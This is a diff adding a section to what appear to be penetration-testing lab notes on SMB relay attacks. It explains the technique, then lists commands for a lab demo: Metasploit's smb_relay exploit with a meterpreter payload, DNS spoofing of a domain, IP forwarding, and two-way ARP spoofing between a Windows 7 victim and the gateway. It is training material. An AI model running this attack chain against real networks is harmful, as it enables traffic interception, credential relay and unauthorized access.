@@ -456,8 +456,76 @@ We can use the information obtained for a brute-force attack:
 
 We can use the metasploit psexec module to exploit the system.
 
+# SMB Relay Attack
+
+- An SMB relay attack is a type of network attack where an attacker intercepts SMP traffic, manipulates it and relays it to a legitimate server to gain unauthorized access to resources or perform malicious actions.
+- This type of attack is common in Windows networks, where SMB is used for file sharing, printer sharing, and other network services.
+
+## How SMB Relay Attacks Work
+
+- Interception: Attacker sets up man-in-the-middle position between the client and server, by using techniques like ARP spoofing, DNS poisoning, or setting up a rouge SMB server.
+- Capturing Authentication: When a client connects to a legitimate server via SMB, it sends authentication data. The attacker captures this data, which might include NTLM (NT Lan Manager) hashes.
+- Relaying to a legitimate Server: Instead of decrypting the captured NTLM hash, the attacker relays it to another server that trusts the source. This allows the attacker to impersonate the user whose hash was captured.
+- Gain Access: If the relay is successful, the attacker can gain access to the resources on the server, which might include sensitive files, databases, or administrative privs. This access lead to further lateral movement within the network, compromising additional systems.
+
+## Demo: SMB Relay Attack
 
 
+We set up the SMB relay using the appropriate metasploit module: 
+
+`msfconsole`
+
+`search smb_relay`
+
+`use exploit/windows/smb/smb_relay`
+
+We keep the default meterpreter payload
+
+New Tab
+
+`ifconfig`
+
+`show options`
+
+srvhost and lhost should be the kali linux IP
+
+`set srvhost [kaliIP]`
+
+`set lhost [kaliIP]`
+
+Based on the network diagram, we set the smb host IP to the one of the client:
+
+`set SMBHost 172.16.5.10`
+
+`show options`
+
+`exploit`
+
+`jobs`
+
+We need to configure the NS spoofing so the victim gets redirected to our kali system when theres a SMB connection to any host in the domain (sportsfoo.com)
+
+We create a file that emulates a hostfile / file that contains dns records
+
+`echo "172.16.5.101 *.sportsfoo.com" > dns`
+
+We now use DNSspoof:
+
+`dnsspoof -i eth1 -f dns`
+
+We set up the man-in-the-middle attack. Our goal is to poison the traffic between the victim (win7) and the default gateway.
+
+New Tab
+
+`echo 1 > /proc/sys/net/ipv4/ip_forward`
+
+In 2 seperate terminals we going to start the arp spoof attack between the Win7 sytem and the gateway.
+
+`arpspoof -i eth1 -t 172.16.5.5 172.16.5.1`
+
+New Tab. We reverse the arp spoof attack
+
+`arpspoof -i eth1 -t 172.16.5.1 172.16.5.5`
 
 
 
